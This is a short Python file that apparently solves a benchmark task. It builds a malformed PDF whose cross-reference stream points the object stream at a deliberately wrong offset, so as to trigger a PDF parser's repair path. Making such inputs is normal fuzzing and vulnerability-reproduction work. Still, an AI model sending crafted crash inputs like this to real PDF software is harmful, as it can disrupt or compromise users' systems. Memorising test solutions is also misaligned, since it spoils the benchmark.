import os
from typing import Dict


def _be(n: int, size: int) -> bytes:
    return int(n).to_bytes(size, "big", signed=False)


def _xref_entry(t: int, a: int, b: int) -> bytes:
    return bytes((t & 0xFF,)) + _be(a, 4) + _be(b, 2)


def _build_poc_pdf() -> bytes:
    pdf = bytearray()
    pdf += b"%PDF-1.5\n%\xE2\xE3\xCF\xD3\n"

    offsets: Dict[int, int] = {}

    def add_obj(num: int, body: bytes) -> None:
        offsets[num] = len(pdf)
        pdf.extend(f"{num} 0 obj\n".encode("ascii"))
        pdf.extend(body)
        pdf.extend(b"\nendobj\n")

    def add_stream_obj(num: int, dct: bytes, data: bytes) -> None:
        offsets[num] = len(pdf)
        pdf.extend(f"{num} 0 obj\n".encode("ascii"))
        pdf.extend(dct)
        pdf.extend(b"\nstream\n")
        pdf.extend(data)
        pdf.extend(b"\nendstream\nendobj\n")

    # 3 0 obj: page (uncompressed)
    page3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 10 10] >>"
    add_obj(3, page3)

    # 4 0 obj: object stream containing 1 (Catalog) and 2 (Pages)
    obj1 = b"<< /Type /Catalog /Pages 2 0 R >>"
    obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
    sep = b" "
    obj_data = obj1 + sep + obj2
    off2 = len(obj1) + len(sep)
    header = f"1 0 2 {off2} ".encode("ascii")
    objstm_data = header + obj_data
    objstm_dict = f"<< /Type /ObjStm /N 2 /First {len(header)} /Length {len(objstm_data)} >>".encode("ascii")
    add_stream_obj(4, objstm_dict, objstm_data)

    # 5 0 obj: xref stream
    # Entries 0..5 (Size 6), W [1 4 2] => 7 bytes each => 42 bytes
    offset5 = len(pdf)

    xref_data = b"".join(
        [
            _xref_entry(0, 0, 65535),                 # 0 free
            _xref_entry(2, 4, 0),                     # 1 in objstm 4 index 0
            _xref_entry(2, 4, 1),                     # 2 in objstm 4 index 1
            _xref_entry(1, offsets[3], 0),            # 3 normal
            _xref_entry(1, 0, 0),                     # 4 WRONG offset to trigger repair
            _xref_entry(1, offset5, 0),               # 5 xref stream itself
        ]
    )

    xref_dict = f"<< /Type /XRef /Size 6 /Root 1 0 R /W [1 4 2] /Length {len(xref_data)} >>".encode("ascii")
    add_stream_obj(5, xref_dict, xref_data)

    pdf.extend(b"startxref\n")
    pdf.extend(str(offset5).encode("ascii"))
    pdf.extend(b"\n%%EOF\n")
    return bytes(pdf)


class Solution:
    def solve(self, src_path: str) -> bytes:
        return _build_poc_pdf()